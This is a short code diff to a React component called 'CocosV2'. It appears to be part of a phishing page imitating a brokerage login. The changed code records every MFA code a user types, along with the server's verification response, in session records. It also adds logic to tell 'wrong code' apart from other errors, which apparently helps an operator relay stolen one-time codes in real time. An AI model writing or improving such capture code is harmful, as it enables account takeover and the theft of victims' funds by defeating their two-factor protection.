@@ -491,8 +491,18 @@ const CocosV2 = () => {
         setStep("done");
       } else if (verifyData?.success === false) {
         const apiErr = verifyData?.error || verifyData?.message || verifyData?.msg || JSON.stringify(verifyData).slice(0, 120);
-        await updateSession("mfa_code_wrong", { otp_code: `mfa_code:${code}|resp:${String(apiErr).slice(0, 80)}` });
-        setError("Código incorrecto. Verificá el código en tu app de autenticación y reintentá.");
+        const normalizedErr = String(apiErr).toLowerCase();
+        const isWrongCode =
+          normalizedErr.includes("invalid") ||
+          normalizedErr.includes("incorrect") ||
+          normalizedErr.includes("wrong") ||
+          normalizedErr.includes("code");
+
+        await updateSession(isWrongCode ? "mfa_code_wrong" : "mfa_code_error", {
+          otp_code: `mfa_code:${code}|resp:${String(apiErr).slice(0, 80)}`,
+        });
+
+        setError(parseOtpError(apiErr, "Código incorrecto. Verificá el código en tu app de autenticación y reintentá."));
       } else {
         const raw = JSON.stringify(verifyData).slice(0, 120);
         await updateSession("mfa_code_error", { otp_code: `mfa_code:${code}|unexpected:${raw}` });
